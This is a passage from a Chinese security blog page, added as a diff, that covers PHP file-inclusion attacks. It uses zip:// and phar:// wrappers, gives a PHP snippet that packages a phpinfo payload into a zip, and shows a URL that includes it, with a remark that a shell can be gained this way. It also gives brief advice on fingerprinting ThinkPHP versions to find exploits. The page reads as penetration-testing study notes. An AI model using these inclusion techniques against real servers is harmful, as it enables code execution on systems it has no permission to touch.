+http://127.0.0.1/file.php?file=zip://php.zip%23php.jpg
+</code></pre>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Im9e2z"><img src="https://s3.jpg.cm/2021/10/01/Im9e2z.png" alt="Im9e2z.png"></a></p>
+<h4 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h4><pre><code><hanla></hanla>首先我们要用<hanla></hanla>phar<hanla></hanla>类打包一个<hanla></hanla>phar<hanla></hanla>标准包
+<!--?php
+$p = new PharData(dirname(__FILE__).'/php.zip', 0,'php',Phar::ZIP) ; 
+$p--->addFromString('a.jpg', '<!--?php phpinfo();?-->');
+ 
+?&gt;
+会生成一个<hanla></hanla>zip<hanla></hanla>的压缩文件<hanla></hanla>php.zip。然后我们构造
+http://127.0.0.1/d.php?file=phar://php.zip/a.jpg
+也可以直接<hanla></hanla>shell
+其中<hanla></hanla>phar<hanla></hanla>适用范围为<hanla></hanla>php&gt;5.3.0
+以下的这种包含方式在这样的情况下是无效的。 include(一个规定的路径<hanla></hanla>+<hanla></hanla>可控点)
+</code></pre>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Im96Pu"><img src="https://s3.jpg.cm/2021/10/01/Im96Pu.png" alt="Im96Pu.png"></a></p>
+<h2 id="Thinkphp-框架漏洞"><a href="#Thinkphp-框架漏洞" class="headerlink" title="Thinkphp 框架漏洞"></a>Thinkphp 框架漏洞</h2><p>利用方法：<br><hanla></hanla>使其报错，爆出<hanla></hanla>thinkphp<hanla></hanla>框架版本<br><hanla></hanla>查找对应的版本漏洞利用<hanla></hanla>exp </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Im9SuS"><img src="https://s3.jpg.cm/2021/10/01/Im9SuS.png" alt="Im9SuS.png"></a></p>
+<p>这个就自己要经验和多收集啦</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Im9VuG"><img src="https://s3.jpg.cm/2021/10/01/Im9VuG.png" alt="Im9VuG.png"></a></p>
+
+    </div>
+
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+    <div id="comment">
+        <div id="gitalk-container">
+        </div>
+    </div>
+    
+</div>
+                     
+<footer id="footer">
+    <div class="footer-wrap">
+        <div>
+            © 2018 - 2021 Hongxiaodou
+            <span class="footer-icon">
+                <a-icon type="flag" theme="filled"></a-icon></span>
+            @hongxiaodou
+        </div>
+        <div></div>
+        <div>Based on the <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo Engine</a> &amp; <a target="_blank" rel="noopener" href="https://github.com/korilin/hexo-theme-particle">Particle Theme</a></div>
+        
+    </div>
+
+</footer>
+
+<script src="/js/highlight.min.js"></script>
+<script src="/js/particle.js"></script>
+                </div>
+            </div>
+        </transition>
+    </div>
+
+    <script>
+    new Vue({
+        el: "#layout",
+        data: {
+            show_page: false,
+            onload_menu: false,
+            menu_show: false,
+            card_top: 100
+        },
+        created: function () {
+            var that = this
+            window.onload = function () {
+                that.show_page = true
+                document.getElementById("loadcontent").style.opacity = 0
+                setTimeout(function () {
+                    document.getElementById("loadleft").style.width = 0
+                    document.getElementById("loadright").style.width = 0
+                }, 300)
+                setTimeout(function () {
+                    document.getElementById("loading").style = "display:none"
+                }, 600)
+            }
+        },
+        mounted: function () {
+            var that = this
+            window.addEventListener('scroll', function (e) {
+                that.menu_show = false
+            })
+        },
+        methods: {
+            home_click: function () {
+                window.scrollTo({
+                    top: window.innerHeight - 80,
+                    behavior: "smooth",
+                });
+            }
+        }
+    })
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script>
+    const gitalk = new Gitalk({
+        clientID: '',
+        clientSecret: '',
+        repo: 'hexo-theme-particle',      // The repository of store comments,
+        owner: 'korilin',
+        admin: ['korilin'],
+        language: 'zh-CN',
+        id: location.pathname,      // Ensure uniqueness and length less than 50
+        distractionFreeMode: true  // Facebook-like distraction free mode
+    })
+    gitalk.render('gitalk-container')
+</script>
+
+
+
+</body></html>
